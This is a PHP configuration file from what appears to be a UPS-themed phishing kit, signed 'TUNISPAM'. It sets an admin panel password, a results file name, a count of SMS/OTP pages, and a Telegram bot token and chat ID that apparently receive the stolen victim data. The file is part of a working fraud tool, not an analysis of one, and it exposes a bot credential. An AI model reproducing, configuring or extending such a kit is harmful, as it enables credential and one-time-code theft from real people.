﻿<?php
/*
   ▄████████ ███    █▄     ▄███████▄    ▄████████    ▄████████  █   ████████▄    █
  ███    ███ ███    ███   ███    ███   ███    ███   ███    ███      ███   ▀███ 
  ███    █▀  ███    ███   ███    ███   ███    █▀    ███    ███      ███    ███ 
  ███        ███    ███   ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀      ███    ███ 
▀███████████ ███    ███ ▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀        ███    ███ 
         ███ ███    ███   ███          ███    █▄  ▀███████████      ███    ███ 
   ▄█    ███ ███    ███   ███          ███    ███   ███    ███      ███   ▄███ 
 ▄████████▀  ████████▀   ▄████▀        ██████████   ███    ███      ████████▀  
                                                    ███    ███                 


V2
2020-11-16
ex:TUNISPAM
t.me/superdzone
*/

 // your email 
$yourmail  = "";

// name for file rzult *
$namerand = "upsrzlt";  

// pass admin panel
$pass = "upsuk"; 

// token bot telegram
$botToken="8064563714:AAGzSjfkJn8PxcA18FJu2krwSwgfS0Sbmw0"; 

// chatId telegram
$chatId="8083250607";  

// number page of sms
$otpsend="10";

?>